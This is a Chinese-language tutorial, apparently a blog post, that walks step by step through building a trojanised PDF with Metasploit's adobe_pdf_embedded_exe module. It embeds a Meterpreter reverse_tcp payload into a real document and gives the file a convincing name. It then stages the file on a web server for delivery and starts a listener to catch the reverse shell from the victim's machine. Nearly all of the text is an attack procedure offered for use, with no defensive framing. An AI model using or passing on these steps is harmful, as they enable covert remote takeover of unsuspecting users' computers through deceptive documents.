PDF或可移植文档格式是一种极为复杂的文件格式，由许多模型和半原理表示。与HTML和CSS一样，它也用于文档的布局和介绍。此外，像HTML和CSS一样，它还通过JavaScript引擎和文档API进行了扩展，使开发人员能够将PDF报告转换为应用程序或恶意软件代理。

阅读器是最常用的Adobe产品之一。几乎每台PC上都有一些Adobe Reader变体，可用于阅读PDF。您大概也有。但是，大多数人都不知道Reader遇到的安全问题-他们忽略了升级或修复它。


在本文中，我们将向您展示如何使用恶意PDF文件来破坏目标计算机。

首先，启动msfconsole并搜索“ adobe_pdf”漏洞。Metasploit将为您提供针对各种操作系统设计的众多漏洞。我们将使用的是为Windows系统设计的“

exploit / windows / fileformat / adobe_pdf_embedded_exe”

例如：

 (msf > use exploit/windows/fileformat/adobe_pdf_embedded_exe).

现在，我们应该查看关于此漏洞的可访问数据，为此，请键入“显示选项”命令。

它将向您显示有关PDF名称和默认基本PDF文件位置的默认信息。我们需要更改它并创建我们的恶意PDF文件。在开始本教程之前，我们从网站上下载了“ cybersecurity-101.pdf”文件，因此我们将在该文件中嵌入后门。为此，我们需要设置“ INFILENAME”选项并提供指向“ cybersecurity-101.pdf”文件的直接路径。接下来，我们应通过设置“ FILENAME”将新创建的恶意PDF文件的名称更改为更令人信服的名称。选项。最后，您可以创建自己的警报消息，一旦运行恶意PDF文件，该警报消息就会显示在目标计算机上（此部分是可选的）。为此，您需要设置“ LAUNCH_MESSAGE”选项并提供所需的任何警告或警报消息。

基本设置完成后，我们需要找到一个有效载荷以将其嵌入PDF文件中。键入“显示有效载荷”命令以列出所有可用的有效载荷，然后选择您感兴趣的载荷之一。在此示例中，我们将使用“ windows / meterpreter / reverse_tcp”有效负载。

将“ PAYLOAD”选项设置为“ windows / meterpreter / reverse_tcp”，然后按“ Enter”。键入“显示选项”命令以列出可以进一步设置的所有可用选项。

将“ LHOST”选项设置为攻击者的IP，然后键入“ exploit”以创建恶意PDF文件。您也可以将默认端口号更改为您喜欢的任何端口号，但是在这种情况下，我们将保持不变。

生成过程成功完成后，您的后门PDF文件将存储在“ /root/.msf4/local/Cybersecurity.pdf”位置。现在，让我们将该文件移至我们的Web服务器，以便我们可以将其有效地传递到目标计算机。

例如：

root @ kali：〜＃mv /root/.msf4/local/Cybersecurity.pdf / var / www / html / Evil-Files /

在目标计算机上运行恶意PDF文件之前，我们需要启动侦听器以侦听传入的连接。为此，我们将使用“ exploit / multi / handler”和“ windows / meterpreter / reverse_tcp”有效负载。

将“ LHOST”选项设置为攻击者的IP，并将“ LPORT”设置为在创建恶意PDF文件时使用的端口号。在此示例中，我们保留了默认端口，因此我们将不会对其进行更改并保持原样。然后输入“ exploit”开始收听。

在目标计算机中执行完PDF文件后，它将显示合法的PDF文件内容，但是在后台，我们的恶意后门将运行并将反向外壳连接发送给攻击者计算机。
